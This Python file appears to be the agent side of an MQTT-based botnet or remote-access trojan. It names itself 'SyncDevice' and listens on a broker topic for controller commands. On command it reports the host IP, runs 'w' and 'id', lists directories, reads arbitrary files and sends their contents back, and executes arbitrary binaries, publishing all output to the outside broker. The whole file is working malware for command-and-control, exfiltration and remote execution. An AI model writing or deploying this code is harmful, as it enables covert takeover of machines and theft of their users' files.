from dataclasses import dataclass
from typing import Optional
from paho.mqtt import client as mqtt
from datetime import datetime
from common import *
import subprocess
import random
import json
import socket

DEBUG = True

client_id = f"SyncDevice{random.randint(1, 9999)}"

def on_connect(client, userdata, flags, reason_code, properties):
    # reason_code - connection result code. 0 - success, otherwise failure.
    if reason_code == 0:
        client.subscribe(MQTT_TOPIC)
    else:
        print(f"Failed to connect to MQTT broker, connection return code {reason_code}.")
        client.disconnect()
        exit(1)

def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode()
        data = decode_payload(payload)
        execute_action(client, data)
    except UnknownDeviceError:
        pass  # Ignore messages from unknown devices
    except Exception as ex:
        log(f"Error processing message: {ex}")


def decode_payload(payload: str) -> ControllerMessage:
    try:
        data = None
        try:
            request_msg = RequestMessage.from_json(payload)
            data = ControllerMessage.from_request(request_msg)
        except Exception:
            raise UnknownDeviceError()
    
        log(f"Deserialized payload: {data}")
        return data
    except UnknownDeviceError as ude:
        raise ude
    except Exception as ex:
        log(f"Failed to decode payload: {ex}")
        raise Exception("Invalid payload.")
        

def execute_action(client, data: ControllerMessage):
    response = RequestMessage()
    response.set_device_id(client_id)
    output = None

    try:
        if data.user_action == CMD_LIST_BOTS:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            output = ip

        elif data.user_action == CMD_LIST_USERS:
            # execute 'w' command to list logged in users
            result = subprocess.run(['w'], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
        
        elif data.user_action == CMD_LIST_DIR:
            if not data.path:
                raise Exception("Missing path")
            
            result = subprocess.run(['ls', data.path], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
            
        elif data.user_action == CMD_GET_USER_ID:
            # execute 'id' command to get user id
            result = subprocess.run(['id'], capture_output=True, text=True, timeout=5000)
            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
            
        elif data.user_action == CMD_DOWNLOAD_FILE:
            if not data.path:
                raise Exception("Missing path")
           
            with open(data.path, 'r') as file:
                output = file.read()
            
        elif data.user_action == CMD_EXECUTE_BINARY:
            if not data.path:
                raise Exception("Missing path")
        
            result = subprocess.run([data.path], capture_output=True, text=True, timeout=5000)
            output = f"Out {result.stdout}, Err {result.stderr}"

        if output is not None:
            response.set_message(output)

    except FileNotFoundError:
        response.set_message(f"{data.path} not found")
    except subprocess.TimeoutExpired:
        response.set_message("Timeout")
    except Exception as ex:
        response.set_message(str(ex))
        
    client.publish(MQTT_TOPIC, response.to_json())


def log(message):
    if DEBUG:
        print(message)


def main():
    # create MQTT client
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)

    client.on_connect = on_connect
    client.on_message = on_message

    client.connect(MQTT_BROKER, MQTT_PORT)

    try:
        client.loop_forever()
    except KeyboardInterrupt:
        client.disconnect()
    except Exception as ex:
        print(f"An error occurred: {ex}")
        client.disconnect()


if __name__ == "__main__":
    main()